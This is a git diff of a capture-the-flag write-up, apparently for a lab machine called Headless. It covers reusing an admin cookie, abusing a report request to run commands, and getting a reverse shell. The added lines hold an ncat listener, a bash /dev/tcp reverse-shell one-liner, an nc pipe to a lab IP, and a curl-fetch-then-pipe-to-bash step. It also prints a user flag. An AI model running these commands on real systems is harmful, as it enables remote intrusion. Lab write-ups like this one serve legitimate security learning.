@@ -161,7 +161,7 @@ Pasting that value in to our browser allowed us to access the admin dashboard.
 
 Hitting the generate report button gave us a nice little message telling us that all systems were up and running. This sends a request that we will now see if we can manipulate to get more information about the server since we have elevated privileges now.
 
-### Stealing Flags
+### Stealing User Flag
 
 Hitting the button sends the following request.
 
@@ -194,9 +194,28 @@ If we do `ls ../` we see a `user.txt` which most likely contains the user flag.
 
 There it is! The user flag is `783df97f81a64da97716f2b28b22d6b6`. The root flag looks like it will require some extra steps since running `whoami` tells use we are logged in as `dvir` instead of `root` like we will need to be. Looks like having the admin cookie isn't enough to get root, we will have to once again find a way to elevate our authorization.
 
-#### Elevating Privilege
+### Stealing Root Flag
 
-One thing that will make our life so much easier is if we set up a reverse shell. I have never done this before so I watched [this]() YouTube video to learn how to do it with `ncat`.
+#### Setting Up A Reverse Shell
+
+One thing that will make our life so much easier is if we set up a reverse shell. I have never done this before so I watched [this](https://www.youtube.com/watch?v=S99C5jNkOgA&ab_channel=TheLinuxPoint) YouTube video to learn how to do it with `ncat`.
+
+First thing we will do is listen for connections on port 3000 on our machine by running `ncat -l -v -p 3000`. Then on headless we will want to run `/bin/bash -i >& /dev/tcp/<my-ip>/3000 0>&1` by sending it in the body of our new post request.
+
+![ncat-rs](/images/ncat-rs.png)
+
+Unfortunately, this did not seem to make a connection. We then tried [this](https://www.geeksforgeeks.org/how-to-create-reverse-shells-with-netcat-in-kali-linux/#) from GeeksForGeeks and were able to establish a connection but could not see any output of our commands. Modifying the command to try and send the output to use seemed to make the connection not work at all so we'll have to try some other stuff.
+
+`/bin/sh 2>&1 | nc 10.10.14.160 3000`
+
+After a good hour of trying different things, mainly many different attempts to do this with `curl`, we revisited the original command and thought maybe there was just something we were doing wrong. As it turns out, we were doing something wrong. What was likely happening is that the command `/bin/bash -i >& /dev/tcp/<my-ip>/3000 0>&1` was being interpreted incorrectly for possibly one of many different reasons when sending it straight in the request. What ended up working is taking this command, putting it on our server in `shell.sh`, using `curl` to grab it from the headless server, and then piping the command directly into bash. Upon doing all this, we were able to obtain a reverse shell!
+
+![curl-shell](/images/curl-shell.png)
+
+![reverse-shell](/images/reverse-shell.png)
+
+
+
 
 
 
